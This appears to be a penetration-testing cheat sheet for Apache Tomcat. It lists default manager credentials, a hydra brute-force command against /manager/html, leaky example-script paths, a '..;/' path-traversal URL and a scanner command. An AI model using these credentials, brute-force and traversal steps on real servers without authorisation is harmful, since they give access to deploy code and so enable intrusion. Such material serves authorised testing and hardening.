# Apache Tomcat
Apache Tomcat


## Default credentials
The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But this path is protected by basic HTTP auth, the most common credentials are:
admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat


## Bruteforce
```
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

## vulnerability
### Example Scripts Information Leakage

The following example scripts that come with Apache Tomcat v4.x - v7.x and can be used by attackers to gain information about the system. These scripts are also known to be vulnerable to cross site scripting (XSS) injection.

/examples/jsp/num/numguess.jsp
/examples/jsp/dates/date.jsp
/examples/jsp/snp/snoop.jsp
/examples/jsp/error/error.html
/examples/jsp/sessions/carts.html
/examples/jsp/checkbox/check.html
/examples/jsp/colors/colors.html
/examples/jsp/cal/login.html
/examples/jsp/include/include.jsp
/examples/jsp/forward/forward.jsp
/examples/jsp/plugin/plugin.jsp
/examples/jsp/jsptoserv/jsptoservlet.jsp
/examples/jsp/simpletag/foo.jsp
/examples/jsp/mail/sendmail.jsp
/examples/servlet/HelloWorldExample
/examples/servlet/RequestInfoExample
/examples/servlet/RequestHeaderExample
/examples/servlet/RequestParamExample
/examples/servlet/CookieExample
/examples/servlet/JndiServlet
/examples/servlet/SessionExample
/tomcat-docs/appdev/sample/web/hello.jsp

## Path Traversal (..;/)
```
http://www.vulnerable.com/;param=value/manager/html
```

## Apache Tomcat Snoop Servlet Remote Information Disclosure
```
https://target:ip/examples/jsp/snp/snoop.jsp
```



## tomcat scanning tools
```
sudo python3 -m pip install apachetomcatscanner
apachetomcatscanner -tt target_ip -tp port    --no-check-certificate
```

## refrences
* [scan for Apache Tomcat](https://github.com/p0dalirius/ApacheTomcatScanner)
* [Apache Tomcat Example Scripts](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)
